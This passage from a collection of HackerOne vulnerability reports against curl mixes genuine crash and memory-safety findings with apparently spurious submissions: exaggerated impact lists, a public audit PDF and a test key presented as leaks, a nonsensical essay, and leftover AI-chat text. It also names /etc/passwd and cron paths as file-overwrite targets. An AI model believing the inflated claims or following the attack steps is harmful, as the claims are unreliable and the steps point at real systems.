such as --append (-a), --upload (-T).\n* Therefor I suggest Severity High For this BUG.\n* Still trying to figure out a reliable way to exploit this .\n\nSupporting Material/References:\n-------------------------------\n\n* [CWE-416](/hacktivity/cwe_discovery?id=cwe-416): Use After Free: <https://cwe.mitre.org/data/definitions/416.html>\n* [CWE-123](/hacktivity/cwe_discovery?id=cwe-123): Write-what-where Condition: <https://cwe.mitre.org/data/definitions/123.html>\n* <https://curl.se/libcurl/c/curl_multi_perform.html>\n* <https://everything.curl.dev/cmdline/urls/globbing.html>\n* <https://curl.se/libcurl/c/10-at-a-time.html>\n* <https://www.youtube.com/watch?v=YV3jewkUJ54>\n\nImpact\n------\n\n* The reliable exploit of this bug allow Attacker that controlled server to Execute arbitrary commands on victim's system.\n* The execution could also achieved using some injection techiniques.\n* it might be more impactful if it's chained with another vulnerabilities that allow both controling the url passed to curl/libcurl, and hijacking server responses for heap massaging.\n* Heap feng shui and heap Grooming techniques can be used to overwrite the target address and execute commands on victim's machine (still inverstigating)"
},
{
    "url": "https://hackerone.com/reports/3282709",
    "original_report": "Summary\n-------\n\nThis vulnerability allows an in overflow when adding TLS buffer sizes during an encrypted data tranmission which can lead to incorrect data sizes being sent and TLS security issues while in testing.\n\nWithin testing on a Windows 10 enviroment, Windows's Schannel rejected the malformed TLS handshake constructed as (`SEC_E_INVALID_TOKEN`) which is expected as the vulnerable code at location: `./lib/vtls/schannel.c`:\n\nrules after the TLS connection is established. This also occurs during the data transmission phase, not the handshake itself and windows validates TLS records and rejects obv malformed one's.\n\ncurl adds the three buffers: outbuf which is a TLS header, outbuf[1] which is the encrypted data and then outbuf which is the TLS trailer. curl adds these three together without checking for an int overflow and when on my testing enviroment compiling for 32 bit, if the sizes are large enough, the addition can overflow which results in a small len value.\n\nThis can lead to incorrect data transmission sizes, TLS protocol violations, memory safety issues and worst case I think is a potential security bypass if the overflow causes curl to send less data than intended.\n\nThis can be tested with the proof of concept attached where a malicious HTTP server is served and any windows user with curl connecting to such a malicious server is affected. The only feasible way of exploting this practically would require bypassing Windows Schannel validity due to me getting a `SEC_E_INVALID_TOKEN` rejecting the malformed TLS. This was also tested compiled for 32-bit windows systems where the wraparound is likely.\n\nLog\n===\n\nmath poc\n--------\n\nMalicious server\n----------------\n\nTo replicate\n------------\n\n1. compile the malicious TLS server on Windows and run accordingly for 32-bit: `i686-w64-mingw32-gcc -Wall -Wextra -g3 malicious_server.c -o malicious_server.exe -lws2_32`\n2. execute `curl -k https://localhost:4433/`\n\nVersions affected\n-----------------\n\n8.15.0: release\n8.16.0: dev\n\nImpact\n------\n\nSummary:\n--------\n\nAn attacker can achieve authentication bypass if creds are being tranmitted via TLS like if one sends 4GB of encrypted auth data but in reality someone only sends one byte considering an overflow and then as a result the server would receive incomplete credentials.\n\nAlso possibly, you could prevent data exfiltration if you manipulate again the TLS handshake to trigger the large buffer sizes again which causes the same overflow resulting in less data than the application expects.\n\nThis could lead to a DoS as well as infinite loops could occur when `len` is very small or the connection hangs entirely due to the protocol violation or exhausting resources in general from repeated connection attempts.\n\nReal world: an attacker would need to control or compromise a TLS server, manipulate Windows' `EncryptMessage()` to return specific buffer sizes and trigger the overflow during the transmission of data so in my mind this could also be like incomplete security patches being trasmitted, partial file transfers which appear *complete* or truncated API requests."
},
{
    "url": "https://hackerone.com/reports/3279804",
    "original_report": "Summary\n-------\n\nA stack use-after-scope vulnerability exists in libcurl's HTTP/3 request processing when using `CURLOPT_POSTFIELDS` with stack-allocated buffers. libcurl retains a pointer to user-provided POST data but accesses it after the original stack frame has been destroyed, leading to memory corruption and potential denial of service.\n\nThe vulnerability occurs in `Curl_pretransfer()` at `transfer.c:569` when libcurl calls `strlen()` on the previously stored POST data pointer that now points to invalid stack memory.\n\nSteps to Reproduce / Proof of Concept\n-------------------------------------\n\n### Environment\n\n* libcurl version: 8.16.0-DEV (master branch)\n* Compiler: Clang 20.1.8 with AddressSanitizer\n* Platform: macOS (ARM64)\n* Configuration: HTTP/3 enabled with ngtcp2/nghttp3\n\n### Reproduction Steps\n\n1. Build libcurl with ASAN:\n\n2. Compile the reproducer:\n\n3. Compile and run:\n\n### Crash Output\n\n### Fuzzer Discovery\n\nThis vulnerability was discovered using a custom libFuzzer fuzzing harness.\n\nTechnical Analysis\n------------------\n\n### Root Cause\n\nThe vulnerability stems from libcurl's `CURLOPT_POSTFIELDS` behavior:\n\n1. libcurl stores the pointer but doesn't copy the data\n2. The application's stack buffer becomes invalid after scope exit\n3. libcurl later dereferences the invalid pointer in `Curl_pretransfer()`\n\n   ### Affected Code Path\n\n   curl\\_easy\\_setopt(CURLOPT\\_POSTFIELDS) →\n   curl\\_easy\\_perform() →\n   Curl\\_pretransfer() →\n   strlen(invalid\\_pointer) →\n   CRASH\n\n### Recommended Fix\n\n1. Documentation: Clarify that `CURLOPT_POSTFIELDS` data must remain valid until transfer completion\n2. API Enhancement: Consider adding bounds checking or automatic copying for stack-detected pointers\n3. Alternative API: Promote `CURLOPT_COPYPOSTFIELDS` for safer usage patterns\n\nImpact\n------\n\nSecurity Impact\n---------------\n\n1. Denial of Service: Guaranteed crash leading to application termination\n2. Memory Corruption: Use-after-scope can lead to unpredictable behavior\n3. Potential Code Execution: In specific circumstances, memory corruption could be leveraged for control flow hijacking\n\n### Affected Scenarios\n\n* Applications using libcurl for HTTP/3 requests with POST data\n* Any code pattern where CURLOPT\\_POSTFIELDS points to stack-allocated memory\n* Particularly affects:\n  + HTTP/3 client applications\n  + API clients using stack buffers for request bodies\n  + Embedded systems with limited heap usage\n\n### Real-World Exposure\n\n* Language bindings: Many curl bindings may inadvertently create this pattern\n* Example applications: CLI tools, web scrapers, API clients\n* Severity: High due to HTTP/3 adoption growth and remote exploitability"
},
{
    "url": "https://hackerone.com/reports/3261310",
    "original_report": "Summary:\n--------\n\n`curl_easy_getinfo` `CURLINFO_TLS_SSL_PTR` appears to return invalid `SSL` connection pointer for OpenSSL HTTP/3 connections. Using this `SSL` connection results in a crash, and potential other impacts.\n\nThis issue does not happen with libcurl 8.14.1, suggesting that the bug is in libcurl itself (or libcurl 8.14.1 somehow didn't trigger a bug in the other support libraries).\n\nSome debug output suggest that this *could* be a use after free / dangling pointer issue. If so, the issue might lead to remote code execution. This has not been confirmed at time of writing this report.\n\nAffected version\n----------------\n\n8.15.0 (release)\n8.15.1-DEV (7c23e88d17e0939b4e01c8d05f430e167e148f4b)\n\nSteps To Reproduce:\n-------------------\n\n1. Compile libcurl again OpenSSL 3.5.1, and fresh enough nghttp2, nghttp3 and ngtcp2 (`--with-openssl --with-nghttp2 --with-ngtcp2 --with-nghttp3`)\n2. Compile the following Proof of Concept app with `-fsanitize=address`:\n\n3. Execute the poc:\n\nSupporting Material/References:\n-------------------------------\n\n* This report is AI free for your pleasure. Stop the slop!\n\nImpact\n------\n\nSummary:\n--------\n\n* At least: Denial of service when accessing HTTP/3 sites.\n* Potential: Memory corruption if the returned pointer points to already free memory. Possible remote code execution, depending on the target platform. Further analysis needed to determine the full impact."
},
{
    "url": "https://hackerone.com/reports/3272982",
    "original_report": "Summary:\n--------\n\nA sensitive internal security audit report file for cURL/libcurl—specifically cure53-curl-report-2016.pdf—was found to be publicly accessible via search engine dorking. This file includes detailed vulnerability findings, exploit vectors, code review observations, and remediation advice from the Cure53 audit engagement in 2016.\n\nThe exposure of this report may aid malicious actors in reverse engineering older vulnerabilities or targeting systems running legacy versions of libcurl that have not been patched. The report was retrieved through Google dorking, indicating a potential oversight in public file indexing or access control.\n\nSteps To Reproduce:\n-------------------\n\n* Go to your browser and open Google (or any search engine).\n* Search using the following dorking query:\n\nsite:curl.se grep\n\n* This reveals publicly accessible internal audit reports related to cURL.\n* Click the link titled cure53-curl-report-2016.pdf or go directly to:\n\n<https://curl.se/docs/audit/cure53-curl-report-2016.pdf>\n\n* Open the PDF and navigate to Page 10 to find the detailed description of the Host Header Injection vulnerability (ID: T6).\n\nImpact\n------\n\nSummary:\n--------\n\nAn attacker gaining access to the publicly exposed security audit file (cure53-curl-report-2016.pdf) can leverage the information within to:\n\n1. Discover Exploitable Vulnerabilities:\n\n* The report details multiple vulnerabilities (e.g., Host Header Injection, TLS validation flaws, memory handling issues) with clear descriptions, impact, and affected code areas.\n* Even though some issues are patched, older systems or forks may still be vulnerable.\n\n2. Develop Targeted Exploits:\n\n* The audit includes technical steps, affected functions, and logic flaws that can be used to craft reliable exploits or proofs of concept (PoCs).\n\n3. Attack Legacy Systems:\n\n* Organizations or embedded systems using older versions of libcurl could still be exploitable if they haven’t applied patches.\n* Attackers could scan for such outdated deployments.\n\n4. Undermine Software Supply Chain Security:\n\n* Projects or products depending on outdated libcurl could be targeted indirectly (supply chain attack surface increases).\n\n5. Leak Internal Security Posture:\n\n* The report exposes how the code is audited, what weaknesses are common, and how securely certain parts are implemented—providing attackers with insight into the development process and threat modeling priorities."
},
{
    "url": "https://hackerone.com/reports/3269761",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\n\n[Statement clarifying if an AI was used to find the issue or generate the report]\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. [add step]\n2. [add step]\n3. [add step]\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------"
},
{
    "url": "https://hackerone.com/reports/3264469",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\nA heap use after free (or assertion) can be triggered if some allocations fail\n\nI am not sure you consider allocations failures to be part of security issues, and I am not sure the issue lies in curl or in openssl, but I still think you want something to be fixed.\n\n[Statement clarifying if an AI was used to find the issue or generate the report]\nI did not use AI\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nUsing commit 48c6927f3b708fc6b6c0cd65d7971380798c8696\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\nUse <https://github.com/curl/curl-fuzzer/pull/173> and see the failed runs\n\nRun `FUZZ_VERBOSE=1 /out/curl_fuzzer_http repro` with repro being `echo AJ4AAAACfkIAAQAAAAVAMT86PQ== | base64 -d > repro` I see the following stack traces\n\nThe CI run shows\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------"
},
{
    "url": "https://hackerone.com/reports/3268294",
    "original_report": "Description:\nI discovered that a private RSA key along with its certificate is publicly accessible inside the curl GitHub repository under the file tests/data/stunnel.pem. This file contains a PEM-formatted RSA private key, which should be kept strictly confidential.\n\nSteps to Reproduce:\n\nNavigate to the following URL in the curl GitHub repo:\n<https://github.com/curl/curl/blob/cc872ebc192f64aa6360853fbdbf0476d05b9178/tests/data/stunnel.pem>\n\nView the contents of the file, which contain a private RSA key and certificate.\n\nSuggested Mitigations:\n\nRemove the private key and certificate files from the public repository immediately.\n\nIf these keys are used in any environment, revoke and replace them with newly generated keys.\n\nUse environment variables or secure vaults to store sensitive keys instead of including them in source code repositories.\n\nAdditional Notes:\n\nThe key appears to be 1024-bit RSA with an outdated signature algorithm (md5WithRSAEncryption).\n\nThe certificate validity expired long ago, indicating this might be a test key, but its public exposure is still a security risk.\n\nConsider adding scanning tools or git pre-commit hooks to prevent committing private keys in the future.\n\nIf you want, I can help you tailor this report for submission or convert it into a specific bug bounty platform format.\n\nImpact\n------\n\nImpact:\n\nDisclosure of private keys compromises the security of encrypted communications.\n\nIf these keys are used anywhere in production or test environments, an attacker can fully compromise secure channels or authenticate maliciously.\n\nExposure of private keys in a public repository is a critical security risk, as it could allow attackers to:\n\nImpersonate the server or service using this key\n\nDecrypt sensitive communication if the key is used in production or testing environments\n\nConduct man-in-the-middle (MITM) attacks"
},
{
    "url": "https://hackerone.com/reports/3261248",
    "original_report": "Summary:\n--------\n\n`curl_easy_getinfo` for `CURLINFO_TLS_SESSION` and `CURLINFO_TLS_SSL_PTR` incorrectly return `CURLSSLBACKEND_OPENSSL` in `struct curl_tlssessioninfo` `backend` field for GnuTLS.\n\nThe bug is at <https://github.com/curl/curl/blob/2db8ae480fdcae7f005bf847fbbf837821c8184c/lib/vquic/vquic-tls.c#L211>\n\nIf the caller interprets the `backend` and makes dynamic decision on the value it will parse `gnutls_session_t` as `SSL_CTX`  / `SSL`, leading to type confusion.\n\nExample of an affected code can be found from:\n<https://github.com/curl/curl/blob/7c23e88d17e0939b4e01c8d05f430e167e148f4b/docs/libcurl/opts/CURLINFO_TLS_SSL_PTR.md?plain=1#L144>\n\nWhat actually happens when the incorrect pointer is passed to OpenSSL functions is unknown and depends on the specific application code and what functions it will call. At minimum a crash is likely, but other impacts can't easily be ruled out, especially considering wide platform and version support in libcurl.\n\nMitigating factors: For this issue to become an issue, the application must be linked against *both* GnuTLS abd OpenSSL . This seems quite unlikely - but isn't entirely impossible. Either way, as such the impact of this vulnerability is limited. I cannot easily point out any affected applications.\n\nAffected version\n----------------\n\n8.15.0\n\nSteps To Reproduce:\n-------------------\n\n1. Have app built against both GnuTLS and OpenSSL.\n2. Have the app use `curl_easy_getinfo` with either `CURLINFO_TLS_SESSION` or `CURLINFO_TLS_SSL_PTR`.\n3. Have code calling OpenSSL functions when `CURLSSLBACKEND_OPENSSL == info->backend`,\n\nSupporting Material/References:\n-------------------------------\n\n* This bug appears to have been added by commit <https://github.com/curl/curl/commit/2db8ae480fdcae7f005bf847fbbf837821c8184c>\n* This report is AI free for your pleasure. Stop the slop!\n\nImpact\n------\n\nSummary:\n--------\n\nCrash, potential unknown other impacts depending on the application code."
},
{
    "url": "https://hackerone.com/reports/3262848",
    "original_report": "Good day. My name is Lorentso Youriévitch Bogdanov. It has come to my attention that you are in need of higher-quality code review. Rest assured that you are not alone in noticing a certain degree of brain-drain in this field. As you can perhaps imagine, the recent shortage of qualified hackers and emergence of charlatans are very much related, and at least in part manufactured by circumstance; be it legal or technological. I myself am here chiefly out of my own personal interest, although my accession to the European Council for Cybersecurity could technically mandate this intervention.\nI would like to apologize in advance for not providing you with a concrete solution to the problem I've identified. It's unlikely to be an actual violation of my exclusivity contract, but I will adhere to the principle in good faith. As such, I also hereby waive any bounty you would award to this report.\n\nMy source review was only cursory. I followed up on several items, few of which made it to reproduction. What little I found is beneath mention, for the most part. However, something particular did catch my eye. A \"vulnerability\", if you'll forgive the air-quotes. Few people would call it that, and you have no doubt grown skeptical of the word yourself as of late. When we start doubting the language we once relied on, something has gone very wrong.\n\nIt did not look serious at first. A degree of excursion is to be expected for a project of this magnitude, and most people do not afford emergent streams of random data a second look - even if it is produced without apparent intent, so-called run-off or garbage code. It is brushed aside like virtual dust. There's the often-heard argument of statistical security, a sort of monkeys-and-typewriters justification for overlooking small risks in favor of larger ones. I cannot disagree, of course. The danger posed by run-off data excursions does not amount to much in the actual lifetime of any program; or of our entire species, in fact. It is too close to zero.\n\nFinding no concrete problem, I turned to theory. By what means could random code become dangerous? Is there a way to turn harmless code harmful, without infinite monkeys? The obvious answer to that would be spoofing. It is one of my preferred approaches, as you can perhaps imagine. But have you ever considered what \"spoofing\" actually means?\nPardon the tangent, but I promise it is crucial. Verification is the alpha and omega of all matters of security. When it is breached, people use such terms as spoofing, attack, intrusion, unauthorized access. The emotional load of these words is obvious, and yet they do not reflect what actually transpired. The truth is, if you are in possession of a physical key, or a password, or otherwise succeed at verification, then you are authorized. That is all there is to it. As such, there is no material or virtual difference between spoofed and \"unspoofed\" data. The only difference is affectual, human. Consider the Ship of Theseus, or the Philosophical Zombie.\nYou may be wondering how these spiritual trappings relate to cURL. To put it crudely, it means that your random run-off data excursions are, by definition, impossible to spoof. And even if it were possible, there would be no discernible difference for you to act on.\n\nOr so I thought. What I found next occupied me for longer than I wish to admit.\nNaturally, the problem with random generation is repetition. I vividly remember the moments of my youth spent scrawling four-digit combinations onto paper as I crossed out more and more possibilities. Today, brute-force is far more powerful, but the principle has not changed - repeat combinations must be avoided. It's a matter that I hesitate to describe as mere efficiency, owing to its scale. I do not wish to drown you in equations, but rest assured that calling it \"exponential\" is an exponential understatement. Once you eliminate repetition, the impossible becomes plausible.\n\nPerhaps you understand my concern now. What if a stream of \"random\" garbage code were to cull its repetitions, creating only new, unique outcomes?\n\nDisaster. Eventually. Very eventually, unlike our abstract monkey friends.\n\nWithin your architecture, it is surprisingly simple. Any vector that achieves sufficient privileges could couple an internal register of combinations to the relevant framework, updated in real-time. The stress on storage would be unprecedented, but by culling repetition it becomes feasible. Utilizing conservative assumptions of clock speed and uptime, I estimate it in merely gigabytes per hour, down from numbers so large I did not expect them to be classified. It turns out they were in fact named, by a colleague I can only imagine was very bored indeed.\nEven with a thousand-fold error margin, would you notice it in time? There is certainly no automated measure in place that would prevent this approach. Forgive me for beating you over the head with this hint, but as I have mentioned, I am not permitted to contribute actual code at this time.\n\nImpact\n------\n\nSo, we now know the problem. The only question remaining is \"when\". I suspect the answer would require enough fallible assumptions to make Frank Drake spin in his grave with sufficient velocity to induce a magnetic reversal of the poles. I would advise you to take this matter very seriously - not in spite of, but precisely BECAUSE of these circumstances. Look back on the history of computing, and humanity in general. You will find ample suffering caused by problems considered theoretical at the time, or completely unknown. Only relatively recently have we gained the ability to scientifically confront disaster before it occurs. This is a privilege, not a right; let us not be complicit in its disuse.\n-LYB"
},
{
    "url": "https://hackerone.com/reports/3258022",
    "original_report": "Summary:\n--------\n\ncurl can crash when accessing an LDAP URL.\n\nNo AI was used in the production of this report. This was enabled by oss-fuzz, but initiated by me adding LDAP support to curl-fuzzer.\n\nAffected version\n----------------\n\nThis works for my system curl as well as master curl.\n\nSteps To Reproduce:\n-------------------\n\nRun this Python script:\n\nThis runs a server on port 1388 which simply returns a binary response.\n\nThen call curl:\n\ncurl asserts in OpenLDAP.\n\nImpact\n------\n\nSummary:\n--------\n\nIf curl is being used on a server and an attacker can influence which URL is being passed to curl, and that URL can use the LDAP protocol, the server will crash, potentially causing outages."
},
{
    "url": "https://hackerone.com/reports/3250490",
    "original_report": "Description\n===========\n\nThe tool\\_debug\\_cb function can write large amounts of debug data to a log file if the --trace or --trace-ascii options are used with a large volume of data. If an attacker can cause cURL to download or upload a very large amount of data (e.g., via a very large HTTP response or an unlimited upload), the log file generated by this debug function can grow indefinitely. This can lead to disk space exhaustion on the system where cURL is running, which in turn can disrupt other services running on the same server.\n\nThis section writes raw HTTP header data to the heads->stream if --dump-header is used. If heads->stream happens to be the same file as the trace output, or if it's another file with unlimited growth potential, it contributes to the problem.\n\nWhen global->tracetype == TRACE\\_PLAIN, this block handles text, headers, and data alerts.\n\nThis is the most significant contributor to the vulnerability when --trace-ascii or --trace-bin is used, as it meticulously logs every byte of transferred data (headers, actual data, SSL data) in a formatted way.\n\nIn essence, the vulnerability isn't a bug in the fwrite or fprintf calls themselves, but rather the lack of a protective wrapper or check around these calls to limit the cumulative data written to the trace log file. The fix involves adding that missing check.\n\nPOC\n===\n\n1. Unlimited data server setup [unli.py]\n\n2. Run curl with the trace option: Open a second terminal and execute the curl command.\n\nYou will now observe output.log rapidly increasing in size as the server continuously streams data and curl logs every bit of it. This demonstrates the Disk Space Exhaustion leading to a Denial of Service (DoS).\n\nHOW TO FIX\n==========\n\nTo address the disk space exhaustion vulnerability you've demonstrated, the primary fix needs to focus on the code sections that write data to the trace log file without any size limitations. In the code snippet you provided, the most relevant places for implementation are:\n\nBefore every fwrite() or fprintf() operation directed to output (or heads->stream): This is where actual data is written to the file. You'll need to add a file size check here.\n\nWithin the dump() function: The dump() function is responsible for writing the formatted binary or ASCII data. This is a critical location because large amounts of data are processed and written to the output here.\n\nHere are the specific areas in your code that would require modification:\n\na. In tool\\_debug\\_cb():\nAt the beginning of the function, before any writes to output or heads->stream occur, you'd perform the check.\n\nb. In the dump() function:\ndump() writes a lot of data, so it's an efficient place to update current\\_trace\\_log\\_size. You'll need to pass the GlobalConfig to dump to access current\\_trace\\_log\\_size.\n\nAdditional\n==========\n\nDisabling Tracing: Once the limit is hit, it's crucial to effectively disable the tracing mechanism (e.g., by setting global->trace\\_stream = NULL and changing global->tracetype to TRACE\\_NONE) to prevent any further attempts to write.\n\nImpact\n------\n\nSystem Instability and Crash (High Impact)"
},
{
    "url": "https://hackerone.com/reports/3250117",
    "original_report": "Description\n===========\n\nThe dumpeasysrc function in the provided code snippet allows an attacker to specify an arbitrary file path for outputting the generated libcurl source code via the global->libcurl variable. If the global->libcurl value is not properly sanitized or restricted, a malicious user could provide a path to a sensitive system file (e.g., /etc/passwd, /etc/cron.d/malicious\\_job, user's .bashrc, etc.) or a device file (e.g., /dev/null, /dev/random).\n\nThe core issue is that fopen(o, FOPEN\\_WRITETEXT) is called directly with o = global->libcurl without any checks on the path provided.\n\nVulnerable code\n===============\n\nProof of Concept (POC) to Prove Real Vulnerability and Step-by-Step\n===================================================================\n\nI will demonstrate overwriting a user-created, non-critical file within a standard temporary directory. This is easily reproducible and clearly shows the integrity impact without attempting to directly compromise critical system files, which might be blocked by OS permissions for a regular user.\n\n1. Create a distinctive, dummy file in a temporary location:\n\n2. Execute the vulnerable curl command to overwrite the file:\n   Assuming your curl executable (the one you built with the vulnerable code) is accessible in your PATH or you're running it with ./curl.\n\nCurl Version\n============\n\nUsing <http://example.com> is better than google.com as it avoids potential redirects and makes the curl output simpler, focusing on the --libcurl aspect.\n\n3. Verify the content of the file after the curl execution:\n\nThe content of /tmp/curl\\_test\\_overwrite.txt will be replaced by the generated libcurl C code. It will look something like this:\n\nImpact\n------\n\nData Corruption/Loss: Arbitrary files can be overwritten with the generated libcurl C source code."
},
{
    "url": "https://hackerone.com/reports/3249936",
    "original_report": "HTTP Request Smuggling Vulnerability Report - cURL\n==================================================\n\nSummary:\n--------\n\ncURL does not explicitly reject HTTP requests that contain both Transfer-Encoding and Content-Length headers, which can lead to HTTP request smuggling vulnerabilities ([CWE-444](/hacktivity/cwe_discovery?id=cwe-444)) when the request passes through intermediary systems (proxies, load balancers, firewalls) that interpret these conflicting headers differently than the destination server. This inconsistent interpretation allows attackers to potentially smuggle malicious requests past security controls or cause cache poisoning attacks.\n\nThe vulnerability stems from the `http_req_set_reader()` function in `http.c` which processes Transfer-Encoding headers without validating for the presence of conflicting Content-Length headers. While cURL internally prioritizes Transfer-Encoding over Content-Length when both are present, it does not remove or reject the conflicting Content-Length header, allowing both headers to be sent in the same request.\n\n**Note:** This vulnerability analysis was conducted through manual code review of the cURL source code. AI assistance was used to help structure and format this vulnerability report.\n\nAffected version\n----------------\n\nThis vulnerability affects cURL versions that include the current HTTP request handling implementation. Testing was performed on:\n\n* **cURL Version:** 8.4.0 (curl-master branch)\n* **Platform:** Windows 10, Linux Ubuntu 20.04\n* **libcurl Version:** 8.4.0\n* **Protocols:** HTTP/1.1, HTTP/2\n* **Features:** SSL, chunked transfer encoding\n\nTo check your version, run:\n\nSteps To Reproduce:\n-------------------\n\n1. **Create a test HTTP request with conflicting headers:**\n2. **Observe that cURL sends both headers without rejection:**\n\n   * Monitor the actual HTTP request using `-v` flag\n   * Confirm both `Transfer-Encoding: chunked` and `Content-Length: 100` headers are present\n   * Note that cURL processes the request using chunked encoding while keeping the Content-Length header\n3. **Test with a proxy setup to demonstrate smuggling potential:**\n4. **Reproduce using Python script for automated testing:**\n5. **Verify the vulnerability by checking HTTP traffic:**\n\n   * Use Wireshark or similar tool to capture the actual HTTP request\n   * Confirm that both conflicting headers are present in the wire protocol\n   * Test the same request against different servers/proxies to observe varying interpretations\n\nSupporting Material/References:\n-------------------------------\n\n* **Source Code Analysis:** Review of `http.c` - `http_req_set_reader()` function and `http_req_complete()` function\n* **CWE Classification:** [CWE-444](/hacktivity/cwe_discovery?id=cwe-444) - Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n* **CVSS Score:** 6.5 (Medium) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L\n* **Proof of Concept Script:** Python script demonstrating the vulnerability (included in steps above)\n* **Network Traffic Capture:** Wireshark/tcpdump capture showing both headers in the same request\n* **RFC References:**\n  + RFC 7230 Section 3.3.3 (Message Body Length)\n  + RFC 7230 Section 3.3.1 (Transfer-Encoding)\n* **Similar CVEs:**\n  + [CVE-2019-16276](/hacktivity/cve_discovery?id=CVE-2019-16276) (Node.js HTTP request smuggling)\n  + [CVE-2020-11946](/hacktivity/cve_discovery?id=CVE-2020-11946) (HTTP request smuggling in various web servers)\n* **Security Research:** James Kettle's \"HTTP Desync Attacks: Request Smuggling Reborn\" whitepaper\n* **Test Environment:** Docker containers with different proxy configurations for testing header interpretation differences\n\nImpact\n------\n\nAn attacker can achieve several significant security impacts by exploiting this HTTP request smuggling vulnerability:\n\n**1. Authentication Bypass**\n\n* Smuggle requests to protected endpoints by bypassing authentication mechanisms\n* Access administrative interfaces or sensitive APIs without proper credentials\n* Escalate privileges by routing requests through different authentication contexts\n\n**2. Cache Poisoning**\n\n* Poison web caches and CDNs by associating malicious content with legitimate URLs\n* Serve malicious content to subsequent users requesting cached resources\n* Manipulate cached responses to inject malicious scripts or redirect users\n\n**3. Request Hijacking**\n\n* Intercept and modify other users' requests in shared proxy environments\n* Steal sensitive data from requests of other users sharing the same connection\n* Manipulate session tokens and authentication credentials\n\n**4. Firewall and Security Control Bypass**\n\n* Circumvent Web Application Firewalls (WAFs) by hiding malicious payloads in smuggled requests\n* Bypass rate limiting and access controls implemented by intermediary devices\n* Evade security monitoring and logging systems\n\n**5. Session Hijacking**\n\n* Manipulate session management by smuggling requests that appear to come from legitimate users\n* Hijack user sessions by intercepting authentication tokens\n* Perform unauthorized actions on behalf of legitimate users\n\n**6. Data Exfiltration**\n\n* Access sensitive data by smuggling requests to internal APIs or databases\n* Bypass data loss prevention (DLP) systems\n* Extract confidential information through carefully crafted smuggled requests\n\n**7. Cross-Site Scripting (XSS) and Injection Attacks**\n\n* Inject malicious scripts into responses through cache poisoning\n* Perform SQL injection attacks by smuggling database queries\n* Execute stored XSS attacks by poisoning cached content\n\n**Impact Severity:** Medium to High depending on the network architecture and security controls in place. The vulnerability is particularly dangerous in environments with multiple proxy layers, CDNs, or shared hosting infrastructures."
},
{
    "url": "https://hackerone.com/reports/3246519",
    "original_report": "Summary:\n--------\n\nCurl sets TLS v1.0 as the default minimum version, which is outdated and vulnerable to attacks like BEAST, posing a risk to data integrity and confidentiality. This was found through manual code review. No AI was used in identifying the issue or generating this report.\n\nAffected Version: Version: 8.15.0-DEV (from source code in <https://github.com/curl/curl>, commit at time of review). Platform: Any using curl with an older OpenSSL version that doesn't enforce a stricter minimum. Output of `curl -V` not applicable as this is a source code issue.\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\nSteps To Reproduce:\n-------------------\n\n1. Check out the file `./docs/libcurl/opts/CURLOPT_SSLVERSION.md`. You'll see in the documentation that curl sets TLS v1.0 as the default minimum version (since version 7.39.0) when using the `CURL_SSLVERSION_DEFAULT` option, unless the TLS library you're using forces a higher version.\n2. In the same GitHub repo, open the file `./lib/vtls/openssl.c` and search for `CURL_SSLVERSION_DEFAULT`. You'll notice that when this default setting is used, curl doesn't set a specific minimum TLS version and just goes with whatever the OpenSSL library defaults to. This can be as low as TLS v1.0 if you're using an older version of OpenSSL.\n3. Now, if you build curl with an older OpenSSL version (like anything before 1.1.0) that defaults to TLS v1.0, or just use the `CURL_SSLVERSION_DEFAULT` setting without changing it, curl can end up making connections with TLS v1.0. This is a problem because TLS v1.0 is vulnerable to attacks like BEAST. This can put your data at risk.\n4. Want to see the danger? Set up curl to connect to a server that allows TLS v1.0, like a test server or using `openssl s_server`. With default settings or an old OpenSSL library, curl will drop to TLS v1.0. An attacker can then exploit this weak connection to snoop on or mess with the data.\n\nSupporting Material/References:\n-------------------------------\n\n* `./docs/libcurl/opts/CURLOPT_SSLVERSION.md` (documentation of default TLS v1.0 minimum).\n* `./lib/vtls/openssl.c` (code handling `CURL_SSLVERSION_DEFAULT` without enforcing a higher minimum).\n\nImpact\n------\n\nSummary: An attacker can crack TLS v1.0 using attacks like BEAST to steal data or mess with connections. This happens if curl uses an older OpenSSL library or sticks to the default minimum version. It puts sensitive info at risk on HTTPS/FTPS links, especially for users who don’t know about this default.\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"
},
{
    "url": "https://hackerone.com/reports/3242005",
    "original_report": "Summary:\n\nA Use-After-Free (UAF) vulnerability exists in libcurl when the OpenSSL SSL\\_CTX\\_set\\_keylog\\_callback is set. The callback may be invoked after the associated SSL object has been freed via SSL\\_free(), leading to access to a dangling pointer and potential crash or information leak via SSL\\_get\\_ex\\_data().\n\nThis can be triggered manually or accidentally through custom keylog callbacks when ex\\_data is accessed inside the callback and the SSL object is no longer valid.\n\nSecurity impact: Under specific conditions (when keylog callback is configured), it results in a segmentation fault (DoS). If further heap grooming or ex\\_data abuse is possible, this may lead to code execution.\n\nAffected version\n\nTested on:\n\ncurl 8.8.0 (OpenSSL 3.3.0)\nRelease-Date: 2024-06-26\nProtocols: dict file ftp ftps gopher gophers http https imap imaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp\nFeatures: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IPv6 Largefile libz NTLM NTLM\\_WB SSL threadsafe TLS-SRP UnixSockets\nPlatform: Termux (Android 11, aarch64)\nOpenSSL: 3.3.0 built from source\n\n---\n\nSteps To Reproduce:\n\n1. Build the following minimal C program (tested with gcc -o segv segv.c -lssl -lcrypto):\n\ninclude <openssl/ssl.h>\n=======================\n\ninclude 